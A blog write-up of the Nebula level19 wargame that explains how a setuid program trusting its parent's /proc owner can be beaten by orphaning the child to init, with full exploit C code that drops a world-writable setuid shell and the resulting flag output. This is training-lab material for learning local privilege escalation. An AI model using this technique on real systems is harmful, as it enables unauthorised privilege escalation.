+++
author = "pwntester"
categories = ["nebula19"]
date = 2013-11-28T19:04:00Z
description = ""
draft = false
slug = "nebula-level19-write-up"
tags = ["nebula19"]
title = "Nebula level19 write-up"

+++

In [Level 19](http://www.exploit-exercises.com/nebula/level19) we are given the source code of a vulnerable program:

```lang-clike line-numbers 
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &statbuf) == -1) {
    printf("Unable to check parent process\n");
    exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
    /* If root started us, it is ok to start the shell */

    execve("/bin/sh", argv, envp);
    err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}
```

The only way to execute the shell is if the parent process was started by **root** and since we are not root, we need to find a way to make that happen. The key is that in Unix if a parent process die while the children are still alive, the children are immediatly relocated and assigned to **init** process. In our case init was started by root:

```lang-bash line-numbers 
level19@nebula:~$ ps -ef | grep init
root         1     0  0 Nov25 ?        00:00:00 /sbin/init
level19  15698 15594  0 11:10 pts/0    00:00:00 grep --color=auto init
```

So we need to write a program that will start our **flag19** program and then kills itself before flag19 checks the parent pid:

```lang-clike line-numbers 
level19@nebula:~$ cat shell.c
#include <linux/unistd.h>

void main() {
  setresuid(geteuid(),geteuid(),geteuid());
  system("/bin/sh");
}
```

and the exploit:

```lang-clike line-numbers 
level19@nebula:~$ cat exploit.c
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
    int childPID = fork();
    if(childPID >= 0) { // fork was successful
        if(childPID == 0) { // child process
	    sleep(1);
	    setresuid(geteuid(),geteuid(),geteuid());
	    char *args[] = {"/bin/sh", "-c", "gcc /home/level19/shell.c -o /tmp/shell; chmod 4777 /tmp/shell", NULL};
	    execve("/home/flag19/flag19", args, envp);
        }
    }
    return 0;
}
```

Now, lets go for the flag:

```lang-clike line-numbers 
level19@nebula:~$ ./exploit
level19@nebula:~$ /tmp/shell
sh-4.2$ id
uid=980(flag19) gid=1020(level19) groups=980(flag19),1020(level19)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

Voila!!
